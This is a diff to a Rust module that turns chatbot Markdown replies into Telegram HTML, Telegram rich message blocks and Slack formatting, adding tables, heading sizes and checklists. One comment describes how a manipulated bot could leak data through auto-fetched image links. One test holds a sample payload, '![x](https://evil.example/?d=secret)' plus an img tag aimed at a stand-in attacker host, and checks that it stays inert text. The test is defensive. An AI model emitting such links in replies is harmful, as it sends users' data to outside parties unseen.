@@ -1,14 +1,31 @@
 //! Bot replies are Markdown; each messaging app wants its own dialect.
-//! Telegram → HTML (parse_mode=HTML), Slack → mrkdwn. Discord speaks Markdown already.
-//! Covers what chat models write: paragraphs, lists, headings, quotes, code, bold/italic, links.
+//! Telegram → rich message blocks (HTML when those aren't taken), Slack → mrkdwn. Discord speaks Markdown already.
+//! Covers what chat models write: paragraphs, lists, headings, quotes, code, tables, bold/italic, links.
+
+use serde_json::{Value, json};
 
 #[derive(Debug, PartialEq)]
 enum Block {
     Para(String),
-    Heading(String),
+    Heading(usize, String),
     Quote(String),
     Code(String),
     List { ordered: bool, items: Vec<String> },
+    /// The header row first; the |---| line under it is gone.
+    Table(Vec<Vec<String>>),
+}
+
+/// "| a | b |" → ["a", "b"].
+fn cells(line: &str) -> Vec<String> {
+    let t = line.trim();
+    let t = t.strip_prefix('|').unwrap_or(t);
+    let t = t.strip_suffix('|').unwrap_or(t);
+    t.split('|').map(|c| c.trim().to_string()).collect()
+}
+
+/// The |---|:--:| line under a table's header.
+fn table_rule(line: &str) -> bool {
+    line.trim().starts_with('|') && line.contains('-') && line.chars().all(|c| matches!(c, '|' | '-' | ':' | ' ' | '\t'))
 }
 
 #[derive(Debug, PartialEq)]
@@ -52,9 +69,19 @@ fn blocks(md: &str) -> Vec<Block> {
                 i += 1;
             }
             out.push(Block::Code(code.join("\n")));
+        } else if line.trim_start().starts_with('|') && lines.get(i + 1).is_some_and(|l| table_rule(l)) {
+            flush(&mut para, &mut out);
+            let mut rows = vec![cells(line)];
+            i += 2;
+            while i < lines.len() && lines[i].trim_start().starts_with('|') {
+                rows.push(cells(lines[i]));
+                i += 1;
+            }
+            out.push(Block::Table(rows));
+            continue;
         } else if let Some(h) = line.trim_start().strip_prefix('#').map(|r| r.trim_start_matches('#')).filter(|r| r.starts_with(' ')) {
             flush(&mut para, &mut out);
-            out.push(Block::Heading(h.trim().into()));
+            out.push(Block::Heading(line.trim_start().len() - h.len(), h.trim().into()));
         } else if let Some((ordered, _)) = list_item(line) {
             flush(&mut para, &mut out);
             let mut items: Vec<String> = vec![];
@@ -169,8 +196,9 @@ fn tg_inline(v: &[Inline]) -> String {
 fn tg_block(b: &Block) -> String {
     match b {
         Block::Para(t) => tg_inline(&inline(t)),
-        Block::Heading(t) => format!("<b>{}</b>", tg_inline(&inline(t))),
+        Block::Heading(_, t) => format!("<b>{}</b>", tg_inline(&inline(t))),
         Block::Quote(t) => format!("<blockquote>{}</blockquote>", tg_inline(&inline(t))),
+        Block::Table(rows) => rows.iter().map(|r| r.iter().map(|c| tg_inline(&inline(c))).collect::<Vec<_>>().join(" | ")).collect::<Vec<_>>().join("\n"),
         Block::Code(t) => format!("<pre>{}</pre>", esc(t)),
         Block::List { ordered, items } => items
             .iter()
@@ -194,6 +222,78 @@ pub fn telegram(md: &str, max: usize) -> Vec<String> {
         }
     }
     out
+}
+
+// ---------------- Telegram (rich message blocks, Bot API 10.1) ----------------
+// Explicit blocks, never Telegram's own Markdown/HTML parsing of the reply: that would take ![](https://…) or <img> as
+// a media block Telegram fetches itself, so a link a misled bot wrote could carry data out unclicked. Here only text,
+// formatting and links ever reach Telegram, and links open only when tapped (after Telegram's "Open this link?").
+
+fn rich_inline(v: &[Inline]) -> Value {
+    Value::Array(
+        v.iter()
+            .map(|x| match x {
+                Inline::Text(t) => json!(t),
+                Inline::Code(t) => json!({"type": "code", "text": t}),
+                Inline::Bold(v) => json!({"type": "bold", "text": rich_inline(v)}),
+                Inline::Italic(v) => json!({"type": "italic", "text": rich_inline(v)}),
+                Inline::Link(v, url) => json!({"type": "url", "text": rich_inline(v), "url": url}),
+            })
+            .collect(),
+    )
+}
+
+fn rich_para(t: &str) -> Value {
+    json!({"type": "paragraph", "text": rich_inline(&inline(t))})
+}
+
+fn rich_block(b: &Block) -> Value {
+    match b {
+        Block::Para(t) => rich_para(t),
+        Block::Heading(n, t) => json!({"type": "heading", "text": rich_inline(&inline(t)), "size": (*n).clamp(1, 6)}),
+        Block::Quote(t) => json!({"type": "blockquote", "blocks": [rich_para(t)]}),
+        Block::Code(t) => json!({"type": "pre", "text": t}),
+        Block::List { ordered, items } => json!({"type": "list", "items": items.iter().enumerate().map(|(n, it)| {
+            // Task lists: "- [ ] call Sam", "- [x] book flights".
+            let task = it.strip_prefix("[ ] ").map(|t| (t, false)).or_else(|| it.strip_prefix("[x] ").or_else(|| it.strip_prefix("[X] ")).map(|t| (t, true)));
+            let mut item = json!({"blocks": [rich_para(task.map_or(it.as_str(), |(t, _)| t))]});
+            if let Some((_, done)) = task {
+                item["has_checkbox"] = json!(true);
+                if done {
+                    item["is_checked"] = json!(true);
+                }
+            }
+            if *ordered {
+                item["value"] = json!(n + 1);
+                item["type"] = json!("1");
+            }
+            item
+        }).collect::<Vec<_>>()}),
+        Block::Table(rows) => json!({"type": "table", "is_bordered": true, "cells": rows.iter().enumerate().map(|(r, row)| {
+            row.iter().map(|c| json!({"text": rich_inline(&inline(c)), "is_header": r == 0, "align": "left", "valign": "top"})).collect::<Vec<_>>()
+        }).collect::<Vec<_>>()}),
+    }
+}
+
+/// Telegram rich messages (`rich_message` for sendRichMessage), split between blocks under Telegram's limits
+/// (32768 characters, 500 blocks): counted on the JSON, which only overcounts.
+pub fn telegram_rich(md: &str) -> Vec<Value> {
+    let (mut out, mut size) = (vec![], (0, 0));
+    for b in blocks(md).iter().map(rich_block) {
+        let s = b.to_string();
+        let cost = (s.chars().count(), s.matches('{').count());
+        match out.last_mut() {
+            Some(Value::Array(last)) if size.0 + cost.0 <= 30_000 && size.1 + cost.1 <= 450 => {
+                last.push(b);
+                size = (size.0 + cost.0, size.1 + cost.1);
+            }
+            _ => {
+                out.push(json!([b]));
+                size = cost;
+            }
+        }
+    }
+    out.into_iter().map(|blocks| json!({"blocks": blocks})).collect()
 }
 
 /// Our Telegram HTML back to readable plain text (fallback when Telegram rejects the markup).
@@ -231,7 +331,7 @@ pub fn slack(md: &str) -> String {
         .iter()
         .map(|b| match b {
             Block::Para(t) => slack_inline(&inline(t)),
-            Block::Heading(t) => format!("*{}*", slack_inline(&inline(t))),
+            Block::Heading(_, t) => format!("*{}*", slack_inline(&inline(t))),
             Block::Quote(t) => format!("> {}", slack_inline(&inline(t))),
             Block::Code(t) => format!("```{}```", esc(t)),
             Block::List { ordered, items } => items
@@ -240,6 +340,7 @@ pub fn slack(md: &str) -> String {
                 .map(|(n, it)| format!("{} {}", if *ordered { format!("{}.", n + 1) } else { "•".into() }, slack_inline(&inline(it))))
                 .collect::<Vec<_>>()
                 .join("\n"),
+            Block::Table(rows) => rows.iter().map(|r| r.iter().map(|c| slack_inline(&inline(c))).collect::<Vec<_>>().join(" | ")).collect::<Vec<_>>().join("\n"),
         })
         .collect::<Vec<_>>()
         .join("\n\n")
@@ -294,6 +395,38 @@ mod tests {
         assert!(s.contains("<https://lee.example/book?a=1&b=2|Dr. Lee>"), "{s}");
         assert!(s.contains("• snake_case_names stay _as is_"), "{s}");
         assert!(s.contains("```let x = a &lt; b;```"), "{s}");
+    }
+
+    #[test]
+    fn telegram_rich_blocks() {
+        let md = "# Plan\n\n| Day | **What** |\n|:--|--:|\n| Mon | [gym](https://g.example) |\n\n- [ ] call Sam\n- [x] book\n\n1. one\n\n![x](https://evil.example/?d=secret) <img src=https://evil.example>";
+        let parts = telegram_rich(md);
+        assert_eq!(parts.len(), 1);
+        let b = &parts[0]["blocks"];
+        assert_eq!(b[0], json!({"type": "heading", "text": ["Plan"], "size": 1}));
+        assert_eq!(b[1]["type"], "table");
+        assert_eq!(b[1]["cells"][0][1]["text"], json!([{"type": "bold", "text": ["What"]}]));
+        assert_eq!(b[1]["cells"][0][1]["is_header"], true);
+        assert_eq!(b[1]["cells"][1][1]["text"], json!([{"type": "url", "text": ["gym"], "url": "https://g.example"}]));
+        assert_eq!(b[1]["cells"].as_array().unwrap().len(), 2, "the |---| rule isn't a row");
+        assert_eq!(b[2]["items"][0], json!({"blocks": [{"type": "paragraph", "text": ["call Sam"]}], "has_checkbox": true}));
+        assert_eq!(b[2]["items"][1]["is_checked"], true);
+        assert_eq!(b[3]["items"][0]["value"], 1);
+        // An image or HTML in the reply is text, never a media block Telegram would fetch.
+        assert_eq!((b.as_array().unwrap().len(), &b[4]["type"]), (5, &json!("paragraph")));
+        assert_eq!(b[4]["text"][1], json!({"type": "url", "text": ["x"], "url": "https://evil.example/?d=secret"}), "a link, opened only if tapped");
+        assert_eq!(b[4]["text"][2], " <img src=https://evil.example>");
+        let long = vec!["word ".repeat(200); 100].join("\n\n");
+        let parts = telegram_rich(&long);
+        assert!(parts.len() > 1 && parts.iter().all(|p| p.to_string().len() < 32_000), "{}", parts.len());
+    }
+
+    #[test]
+    fn tables_elsewhere_stay_readable() {
+        let md = "| a | b |\n|---|---|\n| 1 | **2** |";
+        assert_eq!(telegram(md, 4000), vec!["a | b\n1 | <b>2</b>"]);
+        assert_eq!(slack(md), "a | b\n1 | *2*");
+        assert_eq!(telegram("| not | a table", 4000), vec!["| not | a table"], "no rule line: a paragraph");
     }
 
     #[test]
